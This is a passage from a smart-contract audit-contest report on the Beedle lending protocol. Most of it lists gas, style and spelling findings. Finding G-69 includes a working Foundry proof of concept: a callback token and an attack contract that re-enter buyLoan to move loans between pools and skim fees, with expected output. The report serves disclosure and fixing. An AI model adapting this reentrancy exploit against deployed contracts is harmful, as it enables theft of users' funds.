https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L265

##Summary
The protocol exhibits a vulnerability where the owner has the ability to front-run the setLenderFee function when a borrower attempts to borrow a significant amount of tokens. As the FeeReceiver, the owner can exploit this situation to manipulate the fees by setting them to their maximum value. Consequently, the owner gains control over the user's tokens.

##Vulnerability Details
When a borrower seeks to borrow a substantial number of tokens, and the owner of the protocol also acts as the FeeReceiver, a scenario arises in which the owner can preempt the borrower's transaction. By front-running the borrower's action, the owner can modify the fees, setting them to the maximum possible value. This action allows the owner to take control of the user's tokens.

##Impact
The vulnerability poses a severe risk of fund loss and undermines the trustworthiness of the protocol. If exploited, users may suffer financial losses, eroding confidence in the platform.

##Tools Used
The identified vulnerability was discovered through manual review of the protocol's codebase.

##Recommendations
To address this vulnerability and prevent potential exploitation, it is advisable to introduce a time delay mechanism for the setLenderFee function. By updating the fees after a predetermined duration, for example, using block.timestamp + 5 days, the protocol can create a buffer period during which fee adjustments cannot be modified instantaneously. This time delay mechanism adds an additional layer of protection, mitigating the risk of front-running and unauthorized fee manipulation by the owner.
## <a id='G-69'></a>G-69. Compromised / Malicious owner of `Lender.sol` can favour old pool by transfering all loans to new pool when `buyLoan` called and receive excess rewards.

_Submitted by [Niki](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined). Selected submission by: [JrNet](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L505

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L489-L502

## Vulnerability Details

Note: As per known issues although owner is not suspected to perform any malicious activities, it is a severe issue considerable to think and mitigate.

The reentrancy occurs in the `buyLoan(uint256 loanId, bytes32 poolId)` function in `Lender.sol`. The `loan[loanId]` is updated only after sending protocol fee to the feeReceiver. If owner is compromised or malicious, when someone want to buy a loan there is a possibility of transferring all the loans (not only loan at auction) from old pool to the new pool which leads to acquiring excess `lenderInterest` to old pool and `protocolInterest` to owner (feeReceiver).

## Proof of Concept
Reentrancy is possible if the borrower is lending tokens that can change the control flow. Such tokens are based on ERC20 such as ERC777, ERC223 or other customized ERC20 tokens that alert the receiver of transactions. Example of a real-world popular token that can change control flow is PNT (pNetwork).

The POC will demonstrate the following flow:

Consider 2 Pools.

- Assume Pool_A
    - PoolBalance 9700 tkns
    - Outstanding loans 300 tkns
- Assume Pool_B
    - PoolBalance 1000 tkns
    - Outstanding loans 0 tkns

1. Pool_A sets a loan with 100 tkns to auction
2. Pool_B wanted to buy the loan call `buyLoan(loanId, poolId)`
3. It updates Pool_A and Pool_B poolBalance and outstanding loans. 
    - Pool_A poolBalance added up 100 tkns + lenderInterest
    - Pool_A outstandingLoans are deduced with 100 tkns
    - Pool_B poolBalance is added with 100 tkns + lenderInterest + protocolInterest
    - Pool_B outstandingLoans added 100 tkns
4. Now the protocol Interest is sent to `feeReceiver` who is malicious reenters the function `buyLoan` with same loanId, poolId.
5. As the loan details aren’t updated yet, attacker can reenter until the Pool_A’s outstandingLoans reaches near zero.

Add to `tests/mock/Tokens.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "openzeppelin/token/ERC20/ERC20.sol";

contract TERC20 is ERC20("collateralToken", "ct") {

    function name() public pure override returns (string memory) {
        return "Test ERC20";
    }

    function symbol() public pure override returns (string memory) {
        return "TERC20";
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);
    }
}

interface IERC20WithCallback {
    function beforeTokenTransfer (address to, uint256 amount) external;
}

contract ERC777 is ERC20("loanToken", "lt") {

    function mint(address account, uint256 amount) external returns(bool) {
        _mint(account, amount);
        return true;
    }

    function burnFrom(address account, uint256 amount) external returns(bool) {
        _burn(account, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool)
    {
        _beforeTokenTransfer(to, amount);
        return super.transfer(to, amount);
    }
    function isContract(address addr) public view returns(bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    function _beforeTokenTransfer(address to, uint256 amount) internal {
        if(isContract(to)) {
            IERC20WithCallback(to).beforeTokenTransfer(to, amount);
        }
    }
}
```

Add this to `tests/mock/AttackMock.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {TERC20, ERC777, IERC20WithCallback} from "./Tokens.sol";
import "../../src/Lender.sol";

contract AttackMock is IERC20WithCallback {
    Lender public lender;
    uint256 public loanId;
    bytes32 public poolId;
    bytes32 public oldPoolId;
    uint256 debt;

    function initiate() public returns(Lender) {
        lender = new Lender();
        return lender;
    }

    function setup(uint256 _loanId, bytes32 _poolId) public returns(Lender) {
        loanId = _loanId;
        poolId = _poolId;
        (address _lender,,address _loanToken, address _collateralToken, uint256 _debt,,,,,) = lender.loans(_loanId);
        
        debt = _debt;
        oldPoolId = lender.getPoolId(_lender, _loanToken, _collateralToken);
        return lender;
    }

    function getLender() public view returns(Lender) {
        return lender;
    }

    function beforeTokenTransfer(address to, uint256 amount) external {
        if (poolId != 0) {
            (,,,,uint256 _newPoolBalance,,,,) = lender.pools(poolId);
            (,,,,,,,,uint256 outstandingLoans) = lender.pools(oldPoolId);

            if (_newPoolBalance > debt && outstandingLoans >= debt){
                lender.buyLoan(loanId, poolId);
            }
        }
    }
}
```

Add this to `tests/BuyLoanReentrancy.t.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lender.sol";
import "src/utils/Structs.sol";

import "./mock/AttackMock.sol";

contract BuyLoanReentrancy is Test {
    BuyLoanMock public attackContract = new AttackMock();
    address public attackAddress;
    
    Lender public lender;
    ERC777 public loanToken;
    TERC20 public collateralToken;

    address public lender1 = address(0x1);
    address public lender2 = address(0x2);
    address public lender3 = address(0x3);
    address public lender4 = address(0x4);
    address public borrower = address(0x5);
    address public borrower1 = address(0x6);
    address public borrower2 = address(0x7);

    function setUp() public {
        lender = attackContract.initiate();
        attackAddress = address(attackContract);

        loanToken = new ERC777();
        collateralToken = new TERC20();

        loanToken.mint(address(lender1), 100000*10**18);
        loanToken.mint(address(lender2), 100000*10**18);
        loanToken.mint(address(lender3), 100000*10**18);
        loanToken.mint(address(lender4), 100000*10**18);
        collateralToken.mint(address(borrower), 100000*10**18);
        collateralToken.mint(address(borrower1), 100000*10**18);
        collateralToken.mint(address(borrower2), 100000*10**18);
        vm.startPrank(lender1);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);
        vm.startPrank(lender2);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);
        vm.startPrank(lender3);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);
        vm.startPrank(lender4);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);
        vm.startPrank(borrower);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);    
        vm.startPrank(borrower1);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);    
        vm.startPrank(borrower2);
        loanToken.approve(address(lender), 1000000*10**18);
        collateralToken.approve(address(lender), 1000000*10**18);    
    }

    function test_set_and_borrow(address _lender, address _borrower) public returns(bytes32) {
        // set pool as lender 1
        vm.startPrank(_lender);
        Pool memory p = Pool({
            lender: _lender,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*1e18,
            poolBalance: 10000*1e18,
            maxLoanRatio: 2*1e18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(p);

        vm.startPrank(_borrower);
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 100*1e18,
            collateral: 100*1e18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);
        return poolId;
    }

    function test_borrow(bytes32 _poolId, address _borrower) public {
        vm.startPrank(_borrower);
        Borrow memory b = Borrow({
            poolId: _poolId,
            debt: 100*1e18,
            collateral: 100*1e18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        lender.borrow(borrows);
    }

    function test_buy_loan_reentrancy() public {
        bytes32 poolId = test_set_and_borrow(lender1, borrower);
        
        test_borrow(poolId, borrower1);     
        test_borrow(poolId, borrower2);
        
        // accrue interest
        vm.warp(block.timestamp + 364 days + 12 hours);
        
        // kick off auction
        vm.startPrank(lender1);
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        lender.startAuction(loanIds);

        // create new pool as lender 2
        vm.startPrank(lender2);
        Pool memory p2 = Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100*10**18,
            poolBalance: 1000*10**18,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        bytes32 poolId2 = lender.setPool(p2);

        // warp to middle of auction
        vm.warp(block.timestamp + 12 hours);
        attackContract.setup(0, poolId2);

        // Debug -----------------------------------------------------------------
        (,,,, uint256 _pb2,,,, uint256 _ol2) = lender.pools(poolId);
        (,,,, uint256 _pb3,,,, uint256 _ol3) = lender.pools(poolId2);
        emit log_string("Before Attack: ");
        emit log_string("///////////////////////////////////////");
        emit log_named_decimal_uint("Old Pool Balance: ", _pb2, 18);
        emit log_named_decimal_uint("Outstanding loans: ", _ol2, 18);
        emit log_named_decimal_uint("New Pool Balance: ", _pb3, 18);
        emit log_named_decimal_uint("New Outstanding loans: ", _ol3, 18);
        emit log_named_decimal_uint("Fees Acquired by attacker: ", loanToken.balanceOf(attackAddress), 18);
        emit log_string("");
        // -----------------------------------------------------------------------
  
        // Debug -----------------------------------------------------------------
        emit log_string("when buyLoan executed for single loan of debt 100, attacker (Lender.sol deployer reenter multiple times)");
        emit log_string("");
        // -----------------------------------------------------------------------
        
        // lender 2 buys loan
        lender.buyLoan(0, poolId2);
        vm.stopPrank();

        // Debug -----------------------------------------------------------------
        (,,,, uint256 pb2,,,, uint256 ol2) = lender.pools(poolId);
        (,,,, uint256 pb3,,,, uint256 ol3) = lender.pools(poolId2);
        emit log_string("After Attack: ");
        emit log_string("///////////////////////////////////////");
        emit log_named_decimal_uint("Old Pool Balance: ", pb2, 18);
        emit log_named_decimal_uint("Outstanding loans: ", ol2, 18);
        emit log_named_decimal_uint("New Pool Balance: ", pb3, 18);
        emit log_named_decimal_uint("New Outstanding loans: ", ol3, 18);
        emit log_named_decimal_uint("Fees Acquired by attacker: ", loanToken.balanceOf(attackAddress), 18);
        emit log_string("");
        // -----------------------------------------------------------------------        
    }
}
```

Run the test with command `forge test --match-test test_buy_loan_reentrancy -vv`

Expected Output:
```solidity
[PASS] test_buy_loan_reentrancy() (gas: 1615496)
Logs:
  Before Attack:
  ///////////////////////////////////////
  Old Pool Balance: : 9700.000000000000000000
  Outstanding loans: : 300.000000000000000000
  New Pool Balance: : 1000.000000000000000000
  New Outstanding loans: : 0.000000000000000000
  Fees Acquired by attacker: : 1.500000000000000000

  when buyLoan executed for single loan of debt 100, attacker (Lender.sol deployer reenter multiple times)

  After Attack:
  ///////////////////////////////////////
  Old Pool Balance: : 10027.000000000000000000
  Outstanding loans: : 0.000000000000000000
  New Pool Balance: : 670.000000000000000000
  New Outstanding loans: : 330.000000000000000000
  Fees Acquired by attacker: : 4.500000000000000000
```

## Impact
Leads to acquiring excess fee and also arise centralization issues as lender can be favorable to one of the pools. 

## Tools Used
Foundry

## Recommendations
Use Checks, Effects, Interaction pattern by updating `loan` details before fee transfer or use reentrancyGaurd
## <a id='G-70'></a>G-70. Repeated code

_Submitted by [jaimebarrancos](https://profiles.cyfrin.io/u/undefined), [owade](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined). Selected submission by: [owade](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
The getPoolId() function in Lender.sol is not used in some places thereby not following solidity style guidelines

## Vulnerability Details
In line 570,595 repeated code is used. eg in 595 the following is used.
```
bytes32 oldPoolId = keccak256( 
                abi.encode(
                    loans[loanId].lender,
                    loans[loanId].loanToken,
                    loans[loanId].collateralToken
                )
            );
```
## Impact
Increase in technical debt.
## Tools Used
Manual review
## Recommendations
Use the following in line 108.
```
 function getPoolId(
        address lender,
        address loanToken,
        address collateralToken
    ) public pure returns (bytes32 poolId) {
        poolId = keccak256(abi.encode(lender, loanToken, collateralToken));
    }
```
## <a id='G-71'></a>G-71. Cache IERC20(address)

_Submitted by [jaimebarrancos](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Cache variable IERC20(address) when used more than once in the same function to save gas.


```solidity
267:            IERC20(loan.loanToken).transfer(feeReceiver, fees);
269:            IERC20(loan.loanToken).transfer(msg.sender, debt - fees);

317:            IERC20(loan.loanToken).transferFrom(
323:            IERC20(loan.loanToken).transferFrom(

563:            IERC20(loan.collateralToken).transfer(feeReceiver, govFee);
565:            IERC20(loan.collateralToken).transfer(

642:            IERC20(loan.loanToken).transferFrom(
651:            IERC20(loan.loanToken).transfer(feeReceiver, fee);
653:            IERC20(loan.loanToken).transfer(msg.sender, debt - debtToPay - fee);
656:            IERC20(loan.loanToken).transfer(feeReceiver, protocolInterest);

```


## <a id='G-72'></a>G-72. Unwanted gas expenditure by recomputing already computed value

_Submitted by [JrNet](https://profiles.cyfrin.io/u/undefined), [hash](https://profiles.cyfrin.io/u/undefined), [0xackermann](https://profiles.cyfrin.io/u/undefined). Selected submission by: [hash](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L409

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L511C22-L511C22

## Summary
Unwanted gas is spent on recomputing a value that has already been computed.

## Vulnerability Details
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L355-L432
```solidity
    function giveLoan(
        uint256[] calldata loanIds,
        bytes32[] calldata poolIds
    ) external {
        for (uint256 i = 0; i < loanIds.length; i++) {
           
            ..... more code

            // totalDebt is computed here
            uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;

            ...... more code 
           
            emit Repaid(
                loan.borrower,
                loan.lender,
                loanId,
                // totalDebt is recomputed here
                loan.debt + lenderInterest + protocolInterest,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );

            ..... more code
    }
```

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L465-L515
```solidity
    function buyLoan(uint256 loanId, bytes32 poolId) public {
       
        ..... more code

        // totalDebt is computed here
        uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
        
        ...... more code

        emit Repaid(
            loan.borrower,
            loan.lender,
            loanId,
            // totalDebt is recomputed here            
            loan.debt + lenderInterest + protocolInterest,
            loan.collateral,
            loan.interestRate,
            loan.startTimestamp
        );


        ..... more code
    }
```
## Impact
Unwanted gas expenditure

## Tools Used
Forge gas reporter

## Recommendations
Avoid recomputation and use the already computed value
## <a id='G-73'></a>G-73. Refactor checks involving constants first followed by that include state variables to save gas.

_Submitted by [vangrim](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined). Selected submission by: [JrNet](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L183-L184C46

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L199-L200

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L211-L212

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L222-L223C28

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L244C13-L244C58

## Summary

Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (2100 gas) in a function that may ultimately revert in the unhappy case.

## Tools used

manual code review

## Recommendations

`Lender.sol`

```solidity
 function addToPool(bytes32 poolId, uint256 amount) external {
        if (amount == 0) revert PoolConfig();
        if (pools[poolId].lender != msg.sender) revert Unauthorized();
        .
        .
        );
    }
```

```solidity
    function removeFromPool(bytes32 poolId, uint256 amount) external {
        if (amount == 0) revert PoolConfig();
        if (pools[poolId].lender != msg.sender) revert Unauthorized();
        .
        .
    }

```

```solidity
    function updateMaxLoanRatio(bytes32 poolId, uint256 maxLoanRatio) external {
        if (maxLoanRatio == 0) revert PoolConfig();
        if (pools[poolId].lender != msg.sender) revert Unauthorized();
        .
        .
    }

```

```solidity
    function updateInterestRate(bytes32 poolId, uint256 interestRate) external {
        if (interestRate > MAX_INTEREST_RATE) revert PoolConfig();
        if (pools[poolId].lender != msg.sender) revert Unauthorized();
        .
        .
    }

```

```solidity
    function borrow(Borrow[] calldata borrows) public {
        for (uint256 i = 0; i < borrows.length; i++) {
            bytes32 poolId = borrows[i].poolId;
            uint256 debt = borrows[i].debt;
            uint256 collateral = borrows[i].collateral;
            if (collateral == 0) revert ZeroCollateral();
            // get the pool info
            Pool memory pool = pools[poolId];
            // make sure the pool exists
            if (pool.lender == address(0)) revert PoolConfig();
            // validate the loan
            if (debt < pool.minLoanSize) revert LoanTooSmall();
            if (debt > pool.poolBalance) revert LoanTooLarge();
            .
            .
            .
   }
```
## <a id='G-74'></a>G-74. Use predefined address instead of `address(this)`

_Submitted by [codeslide](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/SeeVulnerabilityDetailsForLinks

## Summary
Instead of using `address(this)`, it is more gas-efficient to pre-calculate and use the predefined address. Foundry's `script.sol` and Solmate's `LibRlp.sol` contracts can help pre-determine the address (see [computeCreateAddress](https://book.getfoundry.sh/reference/forge-std/compute-create-address)). The address can be passed in via a constructor argument and assigned to an immutable variable (rather than using a hardcoded constant) so that the code can remain the same across deployments on different networks.
## Vulnerability Details
There are 13 instances of this issue.
<details><summary>View 13 Instances</summary>

```solidity
File: src/Fees.sol

28:         uint256 amount = IERC20(_profits).balanceOf(address(this));

35:                 recipient: address(this),

43:         IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
```

| File Link                                                                   | Instance Count | Instance Links                                                                                                                                                                                                                |
| :-------------------------------------------------------------------------- | -------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Fees.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol) |              3 | [28](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L28),[35](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L35),[43](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L43) |
___
```solidity
File: src/Lender.sol

154:                 address(this),

189:             address(this),

273:                 address(this),

319:                 address(this),

644:                     address(this),

665:                     address(this),
```

| File Link                                                                       | Instance Count | Instance Links                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| :------------------------------------------------------------------------------ | -------------: | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Lender.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol) |              6 | [154](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L154),[189](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L189),[273](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L273),[319](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L319),[644](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L644),[665](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L665) |
___
```solidity
File: src/Staking.sol

39:         TKN.transferFrom(msg.sender, address(this), _amount);

57:         balance = WETH.balanceOf(address(this));

62:         uint256 totalSupply = TKN.balanceOf(address(this));

64:             uint256 _balance = WETH.balanceOf(address(this));
```

| File Link                                                                         | Instance Count | Instance Links                                                                                                                                                                                                                                                                                                      |
| :-------------------------------------------------------------------------------- | -------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| [Staking.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol) |              4 | [39](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L39),[57](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L57),[62](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L62),[64](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L64) |
___
</details>

## Impact
650 gas
## Tools Used
baudit: a custom static code analysis tool; manual review
## Recommendations
Use predefined address instead of `address(this)`.

## <a id='G-75'></a>G-75. [I-02] - Unnecessary Inheritance.

_Submitted by [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [funderbrkrer](https://profiles.cyfrin.io/u/undefined). Selected submission by: [alymurtazamemon](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol#L9

## Details

Unnecessary inheritance, ERC20Votes inherits ERC20Permit and it inherits ERC20, so only ERC20Votes inherits is enough.

## Recommendations

Only inherit ERC20Votes.
## <a id='G-76'></a>G-76. Use named imports instead of plain `import file.sol

_Submitted by [alymurtazamemon](https://profiles.cyfrin.io/u/undefined), [tsvetanovv](https://profiles.cyfrin.io/u/undefined). Selected submission by: [tsvetanovv](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

Using import declarations of the form `import {<identifier_name>} from 'some/file.sol'` avoids polluting the symbol namespace making flattened files smaller, and speeds up compilation.

## Impact

*Instances (4)*:
```solidity
File: Fees.sol

4: import "./utils/Errors.sol";

5: import "./utils/Structs.sol";

```

```solidity
File: Lender.sol

4: import "./utils/Errors.sol";

5: import "./utils/Structs.sol";

```
## <a id='G-77'></a>G-77. Spelling mistake in Lender::seizeLoan

_Submitted by [gss1](https://profiles.cyfrin.io/u/undefined)._      
            


## Vulnerability Details

The comments of Lender::seizeLoan includes spelling mistake, “sieze”.

## Impact

No.

## Tools Used

manual

## Recommendations

```diff
-/// @notice sieze a loan after a failed refinance auction
+/// @notice seize a loan after a failed refinance auction
/// can be called by anyone
-/// @param loanIds the ids of the loans to sieze
+/// @param loanIds the ids of the loans to seize
```

## <a id='G-78'></a>G-78. Spelling/Errors Organization

_Submitted by [johnlaw](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Structs.sol 

Line #75
```
-     /// @notice the virtual balance based on the multipier
+     /// @notice the virtual balance based on the multiplier
```


Perhaps a suggestion to order the `Errors.sol` in the `utils` folder `alphabetically`. After searching I could not find a best practice. I do understand however, grouping them together via functional relationship. To me however, alphabetically is easier to read and a sorted list can make version control diffs cleaner when adding or removing errors in the future. You could similarly alphabetized the `Structs.sol` file.

As is:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

error PoolConfig();
error LoanTooSmall();
error LoanTooLarge();
error RatioTooHigh();
error FeeTooHigh();
error TokenMismatch();
error Unauthorized();
error AuctionStarted();
error AuctionNotStarted();
error AuctionEnded();
error AuctionNotEnded();
error RateTooHigh();
error PoolTooSmall();
error ZeroCollateral();
error AuctionTooShort();
```

Alphabetical:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

error AuctionEnded();
error AuctionNotEnded();
error AuctionNotStarted();
error AuctionStarted();
error AuctionTooShort();
error FeeTooHigh();
error LoanTooLarge();
error LoanTooSmall();
error PoolConfig();
error PoolTooSmall();
error RateTooHigh();
error RatioTooHigh();
error TokenMismatch();
error Unauthorized();
error ZeroCollateral();
```
## <a id='G-79'></a>G-79. Function Name Optimization

_Submitted by [0xackermann](https://profiles.cyfrin.io/u/undefined), [johnlaw](https://profiles.cyfrin.io/u/undefined). Selected submission by: [johnlaw](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
`Lender.sol` and `Staking.sol`       
Public and external function names and public member variable names can be optimized to save gas: [Solidity Gas Optimizations - Function Name](https://blog.emn178.cc/en/post/solidity-gas-optimization-function-name/) 

The Solidity compiler sorts the function selector in hexadecimal order.   
 - If there is a function which is gas sensitive, it's function selector should be near the top.
 - When benchmarking a function to optimize its gas cost, you can't change the name, because you won't know that the changes are the result of the name of the function, and thus it's function selector, or if it's because of the changes made inside the function.   

For example: if `seizeLoan` is called more frequently than `refinance` it should have a selector that is ordered higher. Conversely, if refinance is more frequently used, its selector should be higher. As of right now, I believe the `refinance` function would be more frequent. 

And in `Staking.sol` based on (my assumption) of frequency, it could be something like:
1. `deposit`
2. `withdraw`
3. `claim`    
So you could consider renaming them (by prefixing or appending characters) to move their selectors up in the list and save on gas.   
 
## Impact
Interfaces/abstract contracts can be optimized so the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save 128 gas each during deployment, and renaming functions to have lower method IDs will save `22` gas per call, per sorted position shifted.
## <a id='G-80'></a>G-80. Positions is misspelled in the readme

_Submitted by [33audits](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/README.md

```
The contract does not force the borrower to fully repay their debt when moving potisitions

```
## <a id='G-81'></a>G-81. Test Coverage Improvements

_Submitted by [0xVinylDavyl](https://profiles.cyfrin.io/u/undefined), [timenov](https://profiles.cyfrin.io/u/undefined), [xfu](https://profiles.cyfrin.io/u/undefined), [ch0bu](https://profiles.cyfrin.io/u/undefined). Selected submission by: [xfu](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary

## Vulnerability Details
Adequate test coverage and regular reporting is an essential process in ensuring the codebase works as intended. Insufficient code coverage may lead to unexpected issues and regressions arising due to changes in the underlying smart contract implementation.
#### proof of concept
| File                      | % Lines          | % Statements     | % Branches      | % Funcs        |
|---------------------------|------------------|------------------|-----------------|----------------|
| script/LenderScript.s.sol | 0.00% (0/7)      | 0.00% (0/11)     | 100.00% (0/0)   | 0.00% (0/1)    |
| src/Beedle.sol            | 0.00% (0/4)      | 0.00% (0/4)      | 100.00% (0/0)   | 0.00% (0/4)    |
| src/Fees.sol              | 0.00% (0/5)      | 0.00% (0/7)      | 0.00% (0/2)     | 0.00% (0/1)    |
| src/Lender.sol            | 81.86% (167/204) | 76.40% (204/267) | 44.57% (41/92)  | 55.00% (11/20) |
| src/Staking.sol           | 0.00% (0/30)     | 0.00% (0/36)     | 0.00% (0/12)    | 0.00% (0/5)    |
| src/utils/Ownable.sol     | 0.00% (0/2)      | 0.00% (0/2)      | 100.00% (0/0)   | 0.00% (0/1)    |
| test/Fuzzing.t.sol        | 33.33% (1/3)     | 33.33% (1/3)     | 100.00% (0/0)   | 33.33% (1/3)   |
| test/Lender.t.sol         | 0.00% (0/3)      | 0.00% (0/3)      | 100.00% (0/0)   | 0.00% (0/3)    |
| Total                     | 65.12% (168/258) | 61.56% (205/333) | 38.68% (41/106) | 31.58% (12/38) |

Table above showcases total test coverage of the target contracts.

## Impact

## Tools Used
foundry `forge coverage`

## Recommendations
Ensure the coverage report produced coverage covers all functions within Reality Card's smart contract suite.

## <a id='G-82'></a>G-82. Error in comment

_Submitted by [timenov](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L69

## Summary
There is a misstatement in comment. The comment states that `keccak256(lender, loanToken, collateralToken)` is used, however `keccak256(abi.encode(lender, loanToken, collateralToken))` is used

## Recommendations
Change the comment
## <a id='G-83'></a>G-83. Use unchecked for collateral

_Submitted by [owade](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
Use unchecked when dividing can save gas.
## Vulnerability Details
In lender.sol,the borrow() function has,
```
            if (collateral == 0) revert ZeroCollateral(); 
            // make sure the user isn't borrowing too much
            uint256 loanRatio = (debt * 10 ** 18) / collateral;
```
We can use unchecked for `loanRatio` calculation since collateral will never be zero because of previous statement.
## Impact
Higher runtime gas usage
## Tools Used
Manual review
## Recommendations
consider using 
```
            if (collateral == 0) revert ZeroCollateral(); 
            // make sure the user isn't borrowing too much
            unchecked{
            uint256 loanRatio = (debt * 10 ** 18) / collateral;
            }
```
## <a id='G-84'></a>G-84. Borrower cannot partially repay interest of a loan

_Submitted by [gidirphoto](https://profiles.cyfrin.io/u/undefined)._      
            


## Summary
The repay function of the Lender.sol contract allows a borrower to repay a loan in a specific pool. However, it is currently impossible for the borrower to partially repay the interest of a loan. This is due to the fact that the repay function calculates the lenderintrest and protocol intrest and combines them as one trascation, despite the fact that they are paid to different addresses.

Should this be the function’s intended behavior, consider explicitly documenting it in docstrings. Otherwise, consider implementing the necessary logic to seperate the transaction of lenderintrest and protocolintrest, allowing borrowers to partially repay their loan’s interest.
## Vulnerability Details

